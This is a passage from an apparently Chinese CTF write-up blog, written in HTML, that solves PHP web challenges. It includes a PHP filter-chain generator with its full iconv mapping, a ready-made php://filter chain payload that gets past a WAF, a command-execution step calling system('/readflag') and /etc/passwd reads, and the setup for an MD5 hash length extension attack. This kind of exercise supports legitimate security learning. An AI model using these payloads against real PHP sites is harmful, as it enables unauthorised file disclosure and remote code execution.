+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;c&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;d&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;e&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;f&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;g&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;h&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;i&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;j&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;k&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;l&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;m&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;n&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;o&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;p&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;q&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;r&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;s&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;t&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;u&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;v&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;w&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;x&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;y&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;z&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 初始化过滤链，首先进行base64编码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$filters</span> <span class="o">=</span> <span class="s2">&#34;convert.base64-encode|&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$filters</span> <span class="o">.=</span> <span class="s2">&#34;convert.iconv.UTF8.UTF7|&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 遍历反转后的base64_payload中的每个字符
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">foreach</span> <span class="p">(</span><span class="nx">str_split</span><span class="p">(</span><span class="nx">strrev</span><span class="p">(</span><span class="nv">$base64_payload</span><span class="p">))</span> <span class="k">as</span> <span class="nv">$c</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 为每个字符添加对应的转换规则链
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$filters</span> <span class="o">.=</span> <span class="nv">$conversions</span><span class="p">[</span><span class="nv">$c</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;|&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// 添加base64解码和编码步骤，用于进一步混淆数据
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$filters</span> <span class="o">.=</span> <span class="s2">&#34;convert.base64-decode|&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$filters</span> <span class="o">.=</span> <span class="s2">&#34;convert.base64-encode|&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// 添加UTF8到UTF7的转换，继续混淆数据
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$filters</span> <span class="o">.=</span> <span class="s2">&#34;convert.iconv.UTF8.UTF7|&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 最后添加base64解码完成整个转换链
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$filters</span> <span class="o">.=</span> <span class="s2">&#34;convert.base64-decode&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 构建最终payload，使用php://filter协议和构建的过滤链读取/etc/passwd文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="nv">$final_payload</span> <span class="o">=</span> <span class="s2">&#34;php://filter/</span><span class="si">{</span><span class="nv">$filters</span><span class="si">}</span><span class="s2">/resource=/etc/passwd&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$final_payload</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行后打payload然后就可以执行命令cmd=system(&rsquo;/readflag&rsquo;);</p>
+<img src="image-20250423094358757.png" alt="image-20250423094358757" style="zoom:50%;" />
+<p>此方法没上个方法简洁，但是字母映射表很全所以记录一下。</p>
+<h2 id="连连看到底是连连什么看">连连看到底是连连什么看
+</h2><p>这个题跟上面的题一样，可以用上面的官方脚本进行构造内容改成XYCTF的base64编码就行，当然此题还可以利用其它工具，不过源码和上面原理差不多。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$p</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/http|=|php|file|:|\/|\?/i&#34;</span><span class="p">,</span> <span class="nv">$p</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;waf!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$payload</span><span class="o">=</span><span class="s2">&#34;php://filter/</span><span class="si">$p</span><span class="s2">/resource=/etc/passwd&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$payload</span><span class="p">)</span><span class="o">===</span><span class="s2">&#34;XYCTF&#34;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>打php_filter_chain</p>
+<p><a class="link" href="https://github.com/synacktiv/php_filter_chain_generator"  target="_blank" rel="noopener"
+    >GitHub - synacktiv/php_filter_chain_generator</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python php_filter_chain_generator.py --chain &#39;XYCTF&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250423112149076.png" alt="image-20250423112149076" style="zoom:50%;" />
+<p>直接打XYCTF不行，因为比较是强比较，而这个转换后会有垃圾字符，这时候利用&lt;配合<code>string.strip_tags</code>过滤器剔除垃圾字符，即剔除<code>&lt;</code>后面的所有垃圾字符。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python php_filter_chain_generator.py --chain &#34;XYCTF&lt;&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250423112412272.png" alt="image-20250423112412272" style="zoom:50%;" />
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">p</span><span class="o">=</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">UTF8</span><span class="o">.</span><span class="nx">CSISO2022KR</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">UTF8</span><span class="o">.</span><span class="nx">UTF7</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">ISO2022KR</span><span class="o">.</span><span class="nx">UTF16</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">L6</span><span class="o">.</span><span class="nx">UCS2</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">decode</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">UTF8</span><span class="o">.</span><span class="nx">UTF7</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">CP367</span><span class="o">.</span><span class="nx">UTF</span><span class="o">-</span><span class="mi">16</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">CSIBM901</span><span class="o">.</span><span class="nx">SHIFT_JISX0213</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">UHC</span><span class="o">.</span><span class="nx">CP1361</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">decode</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">UTF8</span><span class="o">.</span><span class="nx">UTF7</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">IBM860</span><span class="o">.</span><span class="nx">UTF16</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">ISO</span><span class="o">-</span><span class="nx">IR</span><span class="o">-</span><span class="mf">143.</span><span class="nx">ISO2022CNEXT</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">decode</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">UTF8</span><span class="o">.</span><span class="nx">UTF7</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">CP861</span><span class="o">.</span><span class="nx">UTF</span><span class="o">-</span><span class="mi">16</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">L4</span><span class="o">.</span><span class="nx">GB13000</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">BIG5</span><span class="o">.</span><span class="nx">JOHAB</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">decode</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">UTF8</span><span class="o">.</span><span class="nx">UTF7</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">INIS</span><span class="o">.</span><span class="nx">UTF16</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">CSIBM1133</span><span class="o">.</span><span class="nx">IBM943</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">IBM932</span><span class="o">.</span><span class="nx">SHIFT_JISX0213</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">decode</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">UTF8</span><span class="o">.</span><span class="nx">UTF7</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">CP</span><span class="o">-</span><span class="nx">AR</span><span class="o">.</span><span class="nx">UTF16</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="mi">8859_4</span><span class="o">.</span><span class="nx">BIG5HKSCS</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">MSCP1361</span><span class="o">.</span><span class="nx">UTF</span><span class="o">-</span><span class="mi">32</span><span class="nx">LE</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">IBM932</span><span class="o">.</span><span class="nx">UCS</span><span class="o">-</span><span class="mi">2</span><span class="nx">BE</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">decode</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">UTF8</span><span class="o">.</span><span class="nx">UTF7</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">L5</span><span class="o">.</span><span class="nx">UTF</span><span class="o">-</span><span class="mi">32</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">ISO88594</span><span class="o">.</span><span class="nx">GB13000</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">CP950</span><span class="o">.</span><span class="nx">SHIFT_JISX0213</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">UHC</span><span class="o">.</span><span class="nx">JOHAB</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">decode</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">UTF8</span><span class="o">.</span><span class="nx">UTF7</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">SE2</span><span class="o">.</span><span class="nx">UTF</span><span class="o">-</span><span class="mi">16</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">CSIBM1161</span><span class="o">.</span><span class="nx">IBM</span><span class="o">-</span><span class="mi">932</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">MS932</span><span class="o">.</span><span class="nx">MS936</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">decode</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">UTF8</span><span class="o">.</span><span class="nx">UTF7</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">decode</span><span class="o">|</span><span class="nx">string</span><span class="o">.</span><span class="nx">strip_tags</span>
+</span></span><span class="line"><span class="cl">    
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>也可以用这个项目跑https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT?tab=readme-ov-file，下面分享的探姬文章讲的很好</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">p=convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UTF16|convert.iconv.L6.UTF-16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|string.strip_tags
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250423112522632.png" alt="image-20250423112522632" style="zoom: 33%;" />
+<p><a class="link" href="https://hvang10.github.io/2024/04/27/XYCTF2024wp/index.html"  target="_blank" rel="noopener"
+    >XYCTF2024wp | HvAng&rsquo;s Nests</a></p>
+<p>下面探姬大佬的文章对上面2题都讲了一下，还算详细</p>
+<p><a class="link" href="https://dqgom7v7dl.feishu.cn/docx/RL8cdsipLoYAMvxl8bJcIERznWH"  target="_blank" rel="noopener"
+    >‌⁠﻿﻿‍⁠‍﻿‍‌﻿‍‬﻿﻿﻿‬‍‬⁠‍⁠【idekCTF 2022】Paywall — Filter链构造和扩展 - 飞书云文档</a></p>
+<p>单论做而言其实我感觉着两个项目讲的有点多余了，上面ezLFl的代码就可以解决，但是这里还是又学习一下这个filter链，顺便用了一下这两个项目。</p>
+<h2 id="give-me-flag">give me flag
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$FLAG_md5</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$FLAG</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;md5&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;value&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nv">$FLAG_md5</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$value</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;value&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$md5</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;md5&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$time</span> <span class="o">=</span> <span class="nx">time</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$FLAG</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="nv">$time</span><span class="p">)</span><span class="o">===</span><span class="nv">$md5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;yes, give you flag: &#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nv">$FLAG</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="mi">48260</span><span class="nx">abecbc53b255f3fdb8f39c4b489</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>打一个哈希拓展延伸，以前写过了<a class="link" href="https://blog.csdn.net/2301_80915592/article/details/144436036?spm=1011.2415.3001.5331"  target="_blank" rel="noopener"
+    >Basectf-所有web-wp-CSDN博客</a>，这里<code>所以你说你懂 MD5?</code>详细讲了此题</p>
+<p>设一个不知道内容的字符串a，我们知道a字符串md5 值和a的长度和已知b的一部分（拓展字符，若没用提供也没关系，但提供了就要考虑进去计算，否则计算出的不是原b字符），就可以算出（a+b）的md5值，这里a就是FLAG，b就是value.time。</p>
